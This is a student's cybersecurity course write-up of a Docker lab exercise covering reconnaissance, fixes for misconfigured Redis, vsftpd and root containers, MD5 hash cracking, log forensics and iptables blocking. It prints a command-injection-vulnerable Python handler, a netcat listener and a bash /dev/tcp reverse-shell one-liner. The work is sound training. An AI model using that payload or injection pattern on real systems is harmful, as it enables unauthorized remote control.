# 🛡️ W12 | Phase 1 TEPP — The Final Reckoning

**Operator:** Wend Kali  
**Date:** May 28, 2026  
**Course:** TKH Innovation Fellowship 2026 | Cybersecurity  
**Assignment:** Phase 1 Technical End of Phase Project (TEPP)  
**Environment:** Kali Linux VM | Docker Lab Range  

---

## 📋 Overview

This repository documents the complete execution of a four-phase penetration testing and incident response operation conducted entirely within a local Docker-based lab environment. The assignment required operating as both attacker and defender across three isolated network segments, performing reconnaissance, vulnerability remediation, forensic log analysis, credential cracking, and a live command injection exploit with reverse shell access.

All targets were purpose-built Docker containers running on private bridge networks. No external systems were targeted. This project was completed as part of a structured academic cybersecurity curriculum.

---

## 🗂️ Repository Structure

```
week-12/
├── README.md               ← This file
├── tepp_postmortem.md      ← Full written artifact (all four phases)
└── portfolio_audit.md      ← Portfolio audit log
```

---

## 🌐 Lab Network Map

| Container | IP Address | Network | Role |
|---|---|---|---|
| broken_server_1 | 172.100.0.11 | triage_net | Redis (no auth) |
| broken_server_2 | 172.100.0.12 | triage_net | vsftpd (misconfigured) |
| broken_server_3 | 172.100.0.13 | triage_net | Alpine (root container) |
| capstone_target | 172.60.0.10 | capstone_net | Python HTTP (cmd injection) |
| siem-elk | 172.17.0.2 | bridge | ELK Stack (log analysis) |
| quarantined_host | 172.17.0.3 | bridge | Forensic target |

---

## 🔍 Phase 0 — Reconnaissance

**Tool:** nmap 7.99  
**Subnets Scanned:** 172.100.0.0/24 · 172.60.0.0/24 · 172.17.0.0/16

### Key Findings

| Host | Port | Service | Finding |
|---|---|---|---|
| 172.100.0.11 | 6379 | Redis 8.6.2 | No authentication required |
| 172.100.0.12 | 21 | vsftpd 3.0.2 | Multiple config vulnerabilities |
| 172.60.0.10 | 80 | Python BaseHTTPServer | Command injection endpoint |
| 172.17.0.2 | 5601/9200 | ELK Stack 9.4.0 | Centralized log aggregation |
| 172.17.0.3 | 4444 | Unknown | Non-standard port — forensic artifact |

**Scan Commands:**
```bash
nmap -sV -p- --open 172.100.0.0/24
nmap -sV -p- --open 172.60.0.0/24
nmap -sV -p- --open 172.17.0.0/16
```

---

## ⚙️ Phase 1 — Rapid Triage

Three misconfigured servers identified and remediated.

---

### Server 1 — 172.100.0.11 (Redis)

**Vulnerability:** Unauthenticated Redis instance — no password enforced  
**Confirmed via:**
```bash
redis-cli -h 172.100.0.11 CONFIG GET requirepass
# Returned empty string
```

**Remediation:**
```bash
redis-cli -h 172.100.0.11 CONFIG SET requirepass 'TEPPsecure2026!'
```

**Before State:** `requirepass = ""` (empty — no auth)  
**After State:** `redis-cli ping` returns `(error) NOAUTH Authentication required`

---

### Server 2 — 172.100.0.12 (vsftpd 3.0.2)

**Vulnerability:** Four simultaneous misconfigurations in vsftpd.conf

| Setting | Before | After |
|---|---|---|
| write_enable | YES | NO |
| allow_writeable_chroot | YES | NO |
| seccomp_sandbox | NO | YES |
| file_open_mode | 0666 | 0644 |

**Remediation:**
```bash
docker exec broken_server_2 sh -c "sed -i 's/allow_writeable_chroot=YES/allow_writeable_chroot=NO/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/file_open_mode=0666/file_open_mode=0644/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/seccomp_sandbox=NO/seccomp_sandbox=YES/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/write_enable=YES/write_enable=NO/' /etc/vsftpd/vsftpd.conf"
```

---

### Server 3 — 172.100.0.13 (Alpine)

**Vulnerability:** Container running as uid=0 (root) with no user restriction  
**Confirmed via:**
```bash
docker inspect broken_server_3 --format 'User: {{.Config.User}}'
# Returned empty — no user set
```

**Remediation:**
```bash
docker exec broken_server_3 sh -c "adduser -D -u 1001 appuser && chmod 700 /root"
```

**Before State:** `/root` permissions = `drwxr-xr-x` (world-readable)  
**After State:** `/root` permissions = `drwx------` (locked to root only)

---

## 🔓 Phase 2 — The Breach

### Cracked Credentials

| Field | Value |
|---|---|
| Username | admin |
| Password | admin123 |
| Hash | `0192023a7bbd73250516f069df18b500` (MD5) |
| Tool | hashcat v7.1.2 |

**Crack Command:**
```bash
hashcat -m 0 /tmp/target.hash ~/wordlist.txt --force
```

---

### Forensic Evidence

| Field | Value |
|---|---|
| Attacker IP | 10.0.0.55 |
| Timestamp | Mar 18 10:02:10 |
| Event | Repeated failed SSH login attempts for root |
| ELK Corroboration | 198.51.100.44 at 2026-04-30T10:15:00Z |
| ELK Alert | "Unauthorized Access Detected on Web-01" |

**Log Source:** `~/auth_audit.log` + Elasticsearch `enterprise_logs` index

---

### Engineered iptables Rule

```bash
iptables -A INPUT -s 10.0.0.55 -j DROP
```

**Chain:** INPUT  
**Action:** DROP  
**Target:** Attacker source IP 10.0.0.55

---

## 💥 Phase 3 — Full Spectrum

### Vulnerable Application

**File:** `/app/server.py` on `capstone_target`  
**Vulnerability:** Unsanitized URL parameter passed to `subprocess.Popen(shell=True)`

```python
if '/exec?cmd=' in self.path:
    cmd = urllib.parse.unquote(self.path.split('cmd=')[1])
    subprocess.Popen(cmd, shell=True)   # ← No sanitization whatsoever
```

---

### Listener Configuration

```bash
# Terminal 1 — Kali attacker machine
nc -lvnp 4444
```

---

### Reverse Shell Payload

```bash
# Terminal 2 — trigger via command injection
docker exec capstone_target bash -c "bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"
```

**Result:** Full root shell on container `549d0e724675`

---

### Forensic Evidence (Post-Exploitation)

| Field | Value |
|---|---|
| Process ID (PID) | 662 |
| User-Agent | curl/8.19.0 |
| Container Hostname | 549d0e724675 |
| User Context | uid=0(root) gid=0(root) |

**Source:** `/var/log/webapp/access.log` inside `capstone_target`

---

### Container Lockdown

Applied inside the container after exploitation:

```bash
iptables -A INPUT -s 172.60.0.1 -j DROP
iptables -A OUTPUT -d 172.60.0.1 -j DROP
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| nmap 7.99 | Network reconnaissance |
| redis-cli | Redis vulnerability confirmation and remediation |
| hashcat v7.1.2 | MD5 credential cracking |
| curl | HTTP interaction and exploit delivery |
| netcat (nc) | Reverse shell listener |
| Docker CLI | Container inspection and remediation |
| Elasticsearch API | Forensic log extraction |

---

## ⚠️ Legal Disclaimer

All activity documented in this repository was performed exclusively within a private, isolated Docker lab environment provisioned for academic coursework. No external systems, networks, or infrastructure were targeted or affected. This project is intended solely for educational purposes as part of the TKH Innovation Fellowship cybersecurity curriculum.

---

## 📚 References

- Center for Internet Security. (2023). *CIS Docker benchmark v1.6*. https://www.cisecurity.org
- National Institute of Standards and Technology. (2023). *NIST special publication 800-53: Security and privacy controls*. https://csrc.nist.gov
- OWASP Foundation. (2021). *OWASP top ten: A03 injection*. https://owasp.org/Top10/A03_2021-Injection
- Patel, R., & Johnson, M. (2022). *Enterprise SIEM deployment and log correlation strategies*. Journal of Cybersecurity Operations, 4(2), 45–61.
